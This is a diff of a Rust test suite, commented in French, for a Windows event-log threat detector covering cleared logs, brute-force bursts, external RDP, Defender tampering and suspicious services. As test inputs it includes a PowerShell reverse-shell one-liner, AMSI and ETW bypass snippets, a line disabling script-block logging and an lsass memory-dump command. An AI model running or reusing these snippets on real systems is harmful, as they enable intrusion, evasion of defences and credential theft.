@@ -65,6 +65,7 @@ fn tout_lu() -> Vec<EtatJournal> {
             nom: (*j).to_string(),
             lecture: Lecture::Lu(Vec::new()),
             active: Some(true),
+            principal: true,
             suites: Vec::new(),
         })
         .collect()
@@ -77,12 +78,33 @@ fn options() -> Options {
     }
 }
 
-fn juger_avec(evs: &[EvenementWindows], etats: &[EtatJournal], options: Options) -> Vec<Jugement> {
+/// Ce qu'écrit tout ordinateur en marche : une ouverture de session d'un service (Security) et un service démarré
+/// (System). Sans eux, Security et System lus mais vides rendent leurs règles non vérifiées (`Manque::Vide`).
+fn ordinaire() -> Vec<EvenementWindows> {
+    vec![
+        sec(4624, 0, &[("LogonType", "5"), ("TargetUserName", "SYSTEM")]),
+        ev(
+            "System",
+            SCM,
+            7036,
+            0,
+            &[("param1", "Windows Update"), ("param2", "running")],
+        ),
+    ]
+}
+
+fn juger_nu(evs: &[EvenementWindows], etats: &[EtatJournal], options: Options) -> Vec<Jugement> {
     let mut m = Moteur::nouveau(REGLES, options, BornesMoteur::default());
     for e in evs {
         m.recevoir(e);
     }
     m.conclure(etats)
+}
+
+fn juger_avec(evs: &[EvenementWindows], etats: &[EtatJournal], options: Options) -> Vec<Jugement> {
+    let mut tous = ordinaire();
+    tous.extend_from_slice(evs);
+    juger_nu(&tous, etats, options)
 }
 
 fn juger(evs: &[EvenementWindows]) -> Vec<Jugement> {
@@ -179,7 +201,7 @@ fn journal_efface_par_104() {
     );
     let js = juger(&[e]);
     let t = trouvailles(&js, "EVT-EFF-001");
-    assert_eq!(t[0].objet, "microsoft-windows-sysmon/operational");
+    assert_eq!(t[0].objet, "microsoft-windows-sysmon/operational|2026-10-18T14:00:00");
     // Pas un 104 de RdpCoreTS (un autre sens dans un autre journal).
     let autre = ev(
         "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational",
@@ -264,6 +286,13 @@ fn trous_de_numeros_juges_selon_leur_nature() {
             .unwrap()
             .gravite,
         Gravite::Info
+    );
+    // Un arrêt au milieu d'un long trou n'excuse pas ce qui manque avant lui.
+    let long = avec_suite(suite(vec![trou(100, 5000, Nature::Absents, 0, 100_000)], 0));
+    let milieu = ev("System", "EventLog", 6008, 50_000, &[]);
+    assert_eq!(
+        gravites(&juger_avec(&[milieu], &long, options()), "EVT-EFF-001"),
+        [Gravite::Alerte]
     );
     let capi = ev("System", "Microsoft-Windows-CAPI2", 41, 1050, &[]);
     let js = juger_avec(&[capi], &etats, options());
@@ -564,7 +593,7 @@ fn rafale_d_echecs_puis_reussite() {
     let t = trouvailles(&js, "EVT-MDP-001");
     assert_eq!(t.len(), 2, "par compte et par adresse : {t:#?}");
     assert!(t.iter().all(|x| x.gravite == Gravite::Alerte && x.nombre == 10));
-    assert!(t.iter().any(|x| x.objet == "administrateur") && t.iter().any(|x| x.objet == "203.0.113.9"));
+    assert!(t.iter().any(|x| x.objet == "rafale:administrateur") && t.iter().any(|x| x.objet == "rafale:203.0.113.9"));
     evs.push(reussite(660, "administrateur", "203.0.113.9", "10"));
     let js = juger(&evs);
     let critiques: Vec<&Trouvaille> = trouvailles(&js, "EVT-MDP-001")
@@ -573,8 +602,33 @@ fn rafale_d_echecs_puis_reussite() {
         .collect();
     assert_eq!(
         critiques.len(),
-        2,
-        "la réussite suit la rafale, par le compte (casse comprise) et par l'adresse"
+        1,
+        "la réussite suit la rafale du compte (casse comprise)"
+    );
+    assert_eq!(critiques[0].objet, "apres:administrateur");
+    // La réussite qui fonde l'alerte est dans ses repères.
+    assert!(critiques[0].reperes.iter().any(|r| r.id == 4624));
+    // Le même compte écrit autrement (« POSTE\\Administrateur », « administrateur@poste ») : la même clé.
+    let mut autrement: Vec<EvenementWindows> = (0..10)
+        .map(|i| {
+            echec(
+                i * 60,
+                if i % 2 == 0 {
+                    "POSTE\\Administrateur"
+                } else {
+                    "administrateur@poste"
+                },
+                "-",
+                "10",
+            )
+        })
+        .collect();
+    autrement.push(reussite(660, "Administrateur", "-", "10"));
+    let js = juger(&autrement);
+    assert!(
+        trouvailles(&js, "EVT-MDP-001")
+            .iter()
+            .any(|t| t.objet == "apres:administrateur")
     );
 }
 
@@ -604,7 +658,7 @@ fn pas_de_rafale_sans_les_dix_dans_la_fenetre() {
         .map(|t| t.objet.as_str())
         .collect();
     objets.sort_unstable();
-    assert_eq!(objets, ["*", "alice"]);
+    assert_eq!(objets, ["rafale:*", "rafale:alice"]);
     // Cinq échecs en dix secondes sur des comptes différents (un programme qui essaie) ; quatre : rien.
     let vite: Vec<EvenementWindows> = (0..5).map(|i| echec(i, &format!("c{i}"), "-", "3")).collect();
     assert_eq!(gravites(&juger(&vite), "EVT-MDP-001"), [Gravite::Alerte]);
@@ -629,9 +683,9 @@ fn une_rafale_qui_ne_tient_qu_a_des_morceaux_abimes_est_un_indice() {
     let t = trouvailles(&js, "EVT-MDP-001");
     // Par compte (dix en dix minutes) : ne tient qu'avec les abîmés. Par ordinateur (cinq en dix secondes) : les
     // cinq vérifiés suffisent.
-    let par_compte = t.iter().find(|x| x.objet == "alice").unwrap();
+    let par_compte = t.iter().find(|x| x.objet == "rafale:alice").unwrap();
     assert!(par_compte.reserves.contains(&Reserve::MorceauAbime) && par_compte.verifies == 0);
-    let vite = t.iter().find(|x| x.objet == "*").unwrap();
+    let vite = t.iter().find(|x| x.objet == "rafale:*").unwrap();
     assert!(vite.reserves.is_empty() && vite.verifies == 5);
 }
 
@@ -670,6 +724,25 @@ proptest! {
         prop_assert_eq!(avant, resume(&juger(&evs)));
     }
 
+    /// Une réussite qui suit une rafale, contre un modèle naïf : dix échecs en dix minutes tous dans les quinze
+    /// minutes d'avant elle, le dernier au plus cinq minutes avant.
+    #[test]
+    fn reussite_apres_rafale_comme_le_modele(echecs in proptest::collection::vec(0i64..4000, 0..30), reussites in proptest::collection::vec(0i64..4000, 1..4)) {
+        let mut evs: Vec<EvenementWindows> = echecs.iter().map(|&s| echec(s, "alice", "-", "3")).collect();
+        evs.extend(reussites.iter().map(|&s| reussite(s, "alice", "-", "3")));
+        let mut a = echecs.clone();
+        a.sort_unstable();
+        let suit = |s: i64| {
+            let avant: Vec<i64> = a.iter().copied().filter(|&x| x <= s).collect();
+            avant.last().is_some_and(|&d| s - d <= 300)
+                && avant.iter().copied().filter(|&x| s - x <= 900).collect::<Vec<_>>().windows(10).any(|w| w[9] - w[0] <= 600)
+        };
+        let attendu = reussites.iter().filter(|&&s| suit(s)).count() as u64;
+        let js = juger(&evs);
+        let obtenu = trouvailles(&js, "EVT-MDP-001").iter().filter(|t| t.gravite == Gravite::Critique).map(|t| t.nombre).sum::<u64>();
+        prop_assert_eq!(obtenu, attendu);
+    }
+
     /// Les rafales contre un modèle naïf : une clé a une rafale si et seulement si dix de ses échecs tiennent dans dix
     /// minutes.
     #[test]
@@ -681,7 +754,7 @@ proptest! {
         let js = juger(&evs);
         prop_assert_eq!(trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.volet == 0), attendu);
         let vite = triees.windows(5).any(|w| w[4] - w[0] <= 10);
-        prop_assert_eq!(trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.objet == "*"), vite);
+        prop_assert_eq!(trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.objet == "rafale:*"), vite);
     }
 }
 
@@ -782,17 +855,30 @@ fn bureau_a_distance_depuis_l_exterieur() {
     );
     let js = juger(&[dehors, maison, reseau, lsm, console, rcm, tailscale]);
     let t = trouvailles(&js, "EVT-RDP-001");
-    let mut objets: Vec<(&str, Gravite)> = t.iter().map(|x| (x.objet.as_str(), x.gravite)).collect();
+    // Par volet (4624, sessions, authentifications) : le compte et d'où, l'adresse dans les détails.
+    let mut objets: Vec<(usize, &str, Gravite)> = t.iter().map(|x| (x.volet, x.objet.as_str(), x.gravite)).collect();
     objets.sort_unstable();
     assert_eq!(
         objets,
         [
-            ("100.101.1.2|alice", Gravite::Info),
-            ("174.127.93.2|poste\\alice", Gravite::Alerte),
-            ("198.51.100.4|poste-alice\\alice", Gravite::Alerte),
-            ("203.0.113.9|alice", Gravite::Alerte),
+            (0, "internet|alice", Gravite::Alerte),
+            (0, "partage|alice", Gravite::Info),
+            (1, "internet|alice", Gravite::Alerte),
+            (2, "internet|alice", Gravite::Alerte),
         ]
     );
+    assert!(t.iter().any(|x| x.details.iter().any(|(_, v)| v == "174.127.93.2")));
+    // Par un tunnel : la boucle locale, en Alerte.
+    let tunnel = sec(
+        4624,
+        0,
+        &[
+            ("LogonType", "10"),
+            ("IpAddress", "127.0.0.1"),
+            ("TargetUserName", "alice"),
+        ],
+    );
+    assert_eq!(gravites(&juger(&[tunnel]), "EVT-RDP-001"), [Gravite::Alerte]);
 }
 
 // ---------------------------------------------------------------------------------------------------------------
@@ -1014,7 +1100,7 @@ fn defender_trouve_coupe_ou_exclut() {
     let js = juger(&[menace, action, coupe, exclusion, reglage, banal]);
     let mut objets: Vec<&str> = trouvailles(&js, "EVT-DEF-001")
         .iter()
-        .map(|t| t.objet.split(':').next().unwrap())
+        .map(|t| t.objet.split([':', '|']).next().unwrap())
         .collect();
     objets.sort_unstable();
     assert_eq!(objets, ["action", "exclusion", "menace", "reglage", "temps-reel"]);
@@ -1026,6 +1112,22 @@ fn defender_qui_n_est_pas_l_antivirus() {
     // Un autre antivirus : Defender se met en retrait lui-même, sans objet.
     let js = juger_avec(
         std::slice::from_ref(&coupe),
+        &tout_lu(),
+        Options {
+            defender_antivirus: Some(false),
+            ..options()
+        },
+    );
+    // La coupure reste dite, en information, avec sa réserve : un faux antivirus inscrit (defendnot) met Defender
+    // en retrait tout autant.
+    let j = regle(&js, "EVT-DEF-001");
+    assert!(!j.sans_objet && j.manques.is_empty());
+    assert_eq!(j.trouvailles.len(), 1);
+    assert_eq!(j.trouvailles[0].gravite, Gravite::Info);
+    assert!(j.trouvailles[0].reserves.contains(&Reserve::AutreAntivirus));
+    // Rien dans le journal : sans objet.
+    let js = juger_avec(
+        &[],
         &tout_lu(),
         Options {
             defender_antivirus: Some(false),
@@ -1045,7 +1147,7 @@ fn defender_qui_n_est_pas_l_antivirus() {
         },
     );
     let j = regle(&js, "EVT-DEF-001");
-    assert!(!j.sans_objet && j.trouvailles.len() == 1);
+    assert!(!j.sans_objet && j.trouvailles.len() == 2);
     // On ne sait pas : dit, jamais « sain ».
     let js = juger_avec(
         &[],
@@ -1163,6 +1265,7 @@ fn etat(nom: &str, lecture: Lecture, active: Option<bool>) -> EtatJournal {
         nom: nom.into(),
         lecture,
         active,
+        principal: true,
         suites: Vec::new(),
     }
 }
@@ -1231,6 +1334,11 @@ fn un_evenement_abime_ne_permet_pas_de_conclure() {
     let js = juger(&[e]);
     let j = regle(&js, "EVT-ADM-001");
     assert!(!j.verifie());
+    assert!(
+        j.manques
+            .iter()
+            .any(|m| matches!(m, Manque::NonVerifies { nombre: 1, .. }))
+    );
     assert!(j.trouvailles[0].reserves.contains(&Reserve::MorceauAbime));
 }
 
@@ -1491,18 +1599,23 @@ fn sur_les_echantillons_publics() {
     let ids = |id: &str| a.jugements.iter().find(|j| j.regle.id == id).unwrap();
     // Le 1102 de security.evtx et le 104 de system.evtx (Sysmon effacé) ; le 1149 depuis une adresse publique ;
     // la rafale d'échecs du Bureau à distance (23.94.153.202) de security_big_sample.evtx.
-    assert!(ids("EVT-EFF-001").trouvailles.iter().any(|t| t.objet == "security"));
     assert!(
         ids("EVT-EFF-001")
             .trouvailles
             .iter()
-            .any(|t| t.objet == "microsoft-windows-sysmon/operational")
+            .any(|t| t.objet.starts_with("security|"))
+    );
+    assert!(
+        ids("EVT-EFF-001")
+            .trouvailles
+            .iter()
+            .any(|t| t.objet.starts_with("microsoft-windows-sysmon/operational|"))
     );
     assert!(
         ids("EVT-RDP-001")
             .trouvailles
             .iter()
-            .any(|t| t.objet.starts_with("174.127.93.2|"))
+            .any(|t| t.details.iter().any(|(_, v)| v == "174.127.93.2"))
     );
     assert!(
         ids("EVT-ADM-001")
@@ -1580,6 +1693,7 @@ fn preuve_d_audit() {
                 preuve: &[4688, 4689],
                 quoi: ("création de processus", "process creation"),
             },
+            sous_categorie: None,
         }],
         limite: None,
         defender: false,
@@ -1720,8 +1834,8 @@ fn scripts_obscurcis_et_services_detournes() {
             None,
         ),
         (
-            "$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting'); $m = $WERNativeMethods.GetMethod('MiniDumpWriteDump')",
-            Some("outil"),
+            "$p = Get-Process lsass; $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting'); $m = $WERNativeMethods.GetMethod('MiniDumpWriteDump')",
+            Some("lsass"),
         ),
         (
             "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sI')))",
@@ -1761,4 +1875,308 @@ fn ordinateur_vivant_sans_journaux_jamais_sain() {
     }
     let r = resultat::resultat(&a, (Utc::now(), std::time::Instant::now()), &|_| false);
     assert_eq!(r.verdict(), "non-verifie");
+}
+
+// ---------------------------------------------------------------------------------------------------------------
+// Après les relectures
+// ---------------------------------------------------------------------------------------------------------------
+
+#[test]
+fn journaux_vides_muets_ou_audit_reduit() {
+    // Security et System lus mais vides : non vérifiées, et sans ouverture de session, l'audit n'est pas prouvé.
+    let js = juger_nu(&[], &tout_lu(), options());
+    let mdp = regle(&js, "EVT-MDP-001");
+    assert!(
+        mdp.manques.contains(&Manque::Vide("Security".into())),
+        "{:?}",
+        mdp.manques
+    );
+    assert!(mdp.manques.iter().any(|m| matches!(m, Manque::NonAudite { .. })));
+    // Security se tait trois jours avant System.
+    let muet = [
+        sec(4624, 0, &[("LogonType", "5")]),
+        ev("System", SCM, 7036, 3 * 86_400, &[]),
+    ];
+    let js = juger_nu(&muet, &tout_lu(), options());
+    assert!(
+        regle(&js, "EVT-ADM-001")
+            .manques
+            .iter()
+            .any(|m| matches!(m, Manque::Muet { journal, .. } if journal == "Security"))
+    );
+    assert!(
+        !regle(&js, "EVT-SRV-001")
+            .manques
+            .iter()
+            .any(|m| matches!(m, Manque::Muet { .. }))
+    );
+    // L'audit des ouvertures de session réduit par un 4719 : les règles qui en dépendent ne sont plus vérifiées.
+    let reduit = sec(
+        4719,
+        10,
+        &[
+            ("SubcategoryGuid", "{0CCE9215-69AE-11D9-BED3-505054503030}"),
+            ("AuditPolicyChanges", "%%8448, %%8450"),
+        ],
+    );
+    let js = juger(&[reduit]);
+    for id in ["EVT-MDP-001", "EVT-RDP-001", "EVT-IDE-001"] {
+        assert!(
+            regle(&js, id)
+                .manques
+                .iter()
+                .any(|m| matches!(m, Manque::AuditReduit { .. })),
+            "{id}"
+        );
+    }
+    assert!(regle(&js, "EVT-ADM-001").verifie());
+}
+
+#[test]
+fn un_arret_n_excuse_que_ce_qu_il_peut() {
+    let etats = avec_suite(suite(
+        vec![
+            trou(100, 199, Nature::Absents, 1000, 1100),
+            trou(300, 5000, Nature::Absents, 5000, 5600),
+        ],
+        0,
+    ));
+    let mut abime = ev("System", "EventLog", 6008, 1050, &[]);
+    abime.verifie = false;
+    let grand = ev("System", "EventLog", 6008, 5500, &[]);
+    let js = juger_avec(&[abime, grand], &etats, options());
+    // Un arrêt d'un morceau abîmé n'excuse rien ; un vrai arrêt n'excuse pas 4 701 enregistrements.
+    assert!(
+        trouvailles(&js, "EVT-EFF-001")
+            .iter()
+            .all(|t| t.gravite == Gravite::Alerte)
+    );
+}
+
+#[test]
+fn a_la_borne_les_plus_graves_restent() {
+    let bornes = BornesMoteur {
+        trouvailles: 5,
+        ..BornesMoteur::default()
+    };
+    let mut evs: Vec<EvenementWindows> = (0..20)
+        .map(|i| sec(4720, i, &[("TargetUserName", &format!("c{i}"))]))
+        .collect();
+    evs.push(sec(4720, 100, &[("TargetUserName", "cache$")]));
+    for ordre in [evs.clone(), evs.into_iter().rev().collect()] {
+        let mut m = Moteur::nouveau(REGLES, options(), bornes.clone());
+        for e in &ordre {
+            m.recevoir(e);
+        }
+        let js = m.conclure(&tout_lu());
+        let adm = regle(&js, "EVT-ADM-001");
+        assert_eq!(adm.trouvailles.len(), 5);
+        assert_eq!(adm.trouvailles[0].gravite, Gravite::Critique);
+        assert_eq!((adm.au_dela, adm.au_dela_pire), (16, Some(Gravite::Info)));
+    }
+}
+
+#[test]
+fn une_critique_ne_se_declare_jamais_normale() {
+    let mut evs: Vec<EvenementWindows> = (0..10).map(|i| echec(i * 30, "alice", "-", "3")).collect();
+    evs.push(reussite(400, "alice", "-", "3"));
+    let a = analyse(juger(&evs));
+    let tout = |_: &str| true;
+    let r = resultat::resultat(&a, (Utc::now(), std::time::Instant::now()), &tout);
+    assert!(
+        r.constats
+            .iter()
+            .any(|c| c.regle == "EVT-MDP-001" && c.niveau == Some(crate::risk::Niveau::Critique))
+    );
+}
+
+#[test]
+fn un_journal_meme_dans_une_archive_n_est_pas_le_journal() {
+    let mut etats: Vec<EtatJournal> = tout_lu().into_iter().filter(|e| e.nom != "Security").collect();
+    let mut melange = etat("Security", Lecture::Lu(Vec::new()), None);
+    melange.principal = false;
+    etats.push(melange);
+    let js = juger_avec(&[], &etats, options());
+    assert!(
+        regle(&js, "EVT-ADM-001")
+            .manques
+            .contains(&Manque::Absent("Security".into()))
+    );
+}
+
+#[test]
+fn services_apres_relecture() {
+    let g = |nom: &str, c: &str| service_suspect(nom, c).map(|x| x.0);
+    // L'exception de Defender ancrée : le programme doit être dans son dossier.
+    assert_eq!(
+        g(
+            "MpKslx",
+            r"C:\Users\Public\evil.exe C:\ProgramData\Microsoft\Windows Defender\Definition Updates\"
+        ),
+        Some(Gravite::Alerte)
+    );
+    assert_eq!(
+        g(
+            "MpKsl1a2b",
+            r"\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{X}\MpKslDrv.sys"
+        ),
+        None
+    );
+    assert_eq!(g("x", r"\\?\UNC\hote\p\x.exe"), Some(Gravite::Alerte));
+    assert_eq!(g("x", r"\??\UNC\hote\p\x.exe"), Some(Gravite::Alerte));
+    // Impacket et Metasploit : un nom au hasard à la racine de Windows.
+    assert_eq!(g("WQxv", r"C:\Windows\aBcDeFgH.exe"), Some(Gravite::Alerte));
+    assert_eq!(g("x", r"%SYSTEMROOT%\qwerty.exe"), Some(Gravite::Alerte));
+    // Sysmon s'installe là, de Microsoft (vu dans un échantillon public).
+    assert_eq!(g("Sysmon64", r"C:\Windows\Sysmon64.exe"), None);
+    assert_eq!(g("SysmonDrv", r"C:\Windows\SysmonDrv.sys"), None);
+    // Un pilote d'outil de matériel en dossier temporaire : à savoir, et un objet qui tient d'une version à l'autre.
+    assert_eq!(
+        g("cpuz154", r"\??\C:\Windows\TEMP\cpuz154\cpuz154_x64.sys"),
+        Some(Gravite::Info)
+    );
+    assert_eq!(g("x", r"C:\Program Files\Riot Vanguard\vgk.sys"), Some(Gravite::Info));
+    assert_eq!(
+        g("x", r#""C:\Program Files\nodejs\node.exe" server.js"#),
+        Some(Gravite::Alerte)
+    );
+    assert_eq!(
+        g("x", r#""C:\Program Files\PowerShell Universal\Universal.Server.exe""#),
+        None
+    );
+    let cpuz = |v: &str| {
+        let e = ev(
+            "System",
+            SCM,
+            7045,
+            0,
+            &[
+                ("ServiceName", v),
+                ("ImagePath", &format!(r"\??\C:\Windows\TEMP\{v}\{v}_x64.sys")),
+            ],
+        );
+        trouvailles(&juger(&[e]), "EVT-SRV-001")[0].objet.clone()
+    };
+    assert_eq!(cpuz("cpuz154"), cpuz("cpuz160"));
+}
+
+#[test]
+fn bits_et_scripts_apres_relecture() {
+    assert_eq!(
+        adresse_inhabituelle("https://drive.google.com/uc?export=download&id=1").map(|x| x.1),
+        Some(Gravite::Alerte)
+    );
+    assert_eq!(
+        adresse_inhabituelle("https://onedrive.live.com/download?cid=1").map(|x| x.1),
+        Some(Gravite::Alerte)
+    );
+    assert_eq!(
+        adresse_inhabituelle("http://wsus01:8530/Content/x.cab").map(|x| x.1),
+        Some(Gravite::Info)
+    );
+    assert_eq!(
+        adresse_inhabituelle("http://wsus.contoso.local/x").map(|x| x.1),
+        Some(Gravite::Info)
+    );
+    assert_eq!(adresse_inhabituelle("https://aka.ms/x"), None);
+    let cas = [
+        ("# Download data from the API\nGet-Date", None),
+        ("Remove-Item x -Confirm:$false; Invoke-Expression $commande", None),
+        (
+            "$a = [Ref].Assembly.GetType('System.Management.Automation.' + $n); $f = $a.GetField($c,'NonPublic,Static'); $f.SetValue($null,$true)",
+            Some("amsi"),
+        ),
+        (
+            "$k=[Kernel32]::GetProcAddress($h,'AmsiScan'+'Buffer'); [Kernel32]::VirtualProtect($k,5,0x40,[ref]0)",
+            Some("amsi"),
+        ),
+        (
+            "$a=[W]::GetProcAddress($h,'EtwEventWrite'); [W]::VirtualProtect($a,1,0x40,[ref]$o)",
+            Some("memoire"),
+        ),
+        (
+            "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',443);$s=$c.GetStream();while(1){$d=(iex $t 2>&1)}",
+            Some("outil"),
+        ),
+        (
+            "Set-ItemProperty HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0",
+            Some("desarme"),
+        ),
+        (
+            "[IO.Compression.GZipStream]::new([IO.MemoryStream][Convert]::FromBase64String($b), 'Decompress')",
+            None,
+        ),
+    ];
+    for (texte, attendu) in cas {
+        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
+    }
+    // PowerShell 2 lancé exprès : des données sans nom, telles que les écrit le journal « Windows PowerShell ».
+    let mut v2 = ev(
+        "Windows PowerShell",
+        "PowerShell",
+        400,
+        0,
+        &[("", "Available"), ("", "None")],
+    );
+    v2.champs.push((String::new(), "\tNewEngineState=Available\r\n\tHostVersion=2.0\r\n\tEngineVersion=2.0\r\n\tHostApplication=powershell -version 2\r\n".into()));
+    let v5 = ev(
+        "Windows PowerShell",
+        "PowerShell",
+        400,
+        1,
+        &[("", "\tEngineVersion=5.1.19041.1\r\n")],
+    );
+    let js = juger(&[v2, v5]);
+    let t = trouvailles(&js, "EVT-PSH-001");
+    assert_eq!(t.len(), 1);
+    assert!(t[0].details.iter().any(|(_, v)| v.contains("-version 2")));
+}
+
+#[test]
+fn defender_et_comptes_apres_relecture() {
+    let echec_d = ev(DEF, DEFP, 1119, 0, &[("Threat Name", "Trojan:Win32/Exemple")]);
+    let un = ev(
+        DEF,
+        DEFP,
+        5007,
+        1,
+        &[(
+            "New Value",
+            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection = 1",
+        )],
+    );
+    let zero = ev(
+        DEF,
+        DEFP,
+        5007,
+        2,
+        &[(
+            "New Value",
+            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection = 0x0",
+        )],
+    );
+    let falsification = ev(DEF, DEFP, 5013, 3, &[("Value", "DisableRealtimeMonitoring")]);
+    let mut g = gravites(&juger(&[echec_d, un, zero, falsification]), "EVT-DEF-001");
+    g.sort();
+    assert_eq!(g, [Gravite::Alerte, Gravite::Alerte, Gravite::Critique]);
+    // Trente échecs sur vingt heures, sous tout seuil de verrouillage ; un compte verrouillé.
+    let lents: Vec<EvenementWindows> = (0..30).map(|i| echec(i * 2400, "alice", "-", "3")).collect();
+    let js = juger(&lents);
+    let t = trouvailles(&js, "EVT-MDP-001");
+    assert!(t.iter().any(|t| t.volet == 4 && t.objet == "lent:alice"), "{t:#?}");
+    // Une rafale rapide n'est pas dite une seconde fois en lente.
+    let vite: Vec<EvenementWindows> = (0..40).map(|i| echec(i * 20, "bob", "-", "3")).collect();
+    let js = juger(&vite);
+    assert!(!trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.objet == "lent:bob"));
+    let verrou = sec(4740, 0, &[("TargetUserName", "alice"), ("TargetDomainName", "POSTE")]);
+    assert_eq!(gravites(&juger(&[verrou]), "EVT-MDP-001"), [Gravite::Alerte]);
+    // Un programme d'un profil (Teams) : à savoir ; un faux svchost dans un profil : se fait passer pour Windows.
+    let par = |p: &str| sec(4648, 0, &[("ProcessName", p), ("TargetUserName", "a")]);
+    let js = juger(&[
+        par(r"C:\Users\bob\AppData\Local\Microsoft\Teams\current\Teams.exe"),
+        par(r"C:\Users\bob\svchost.exe"),
+    ]);
+    let mut g = gravites(&js, "EVT-IDE-001");
+    g.sort();
+    assert_eq!(g, [Gravite::Info, Gravite::Alerte]);
 }
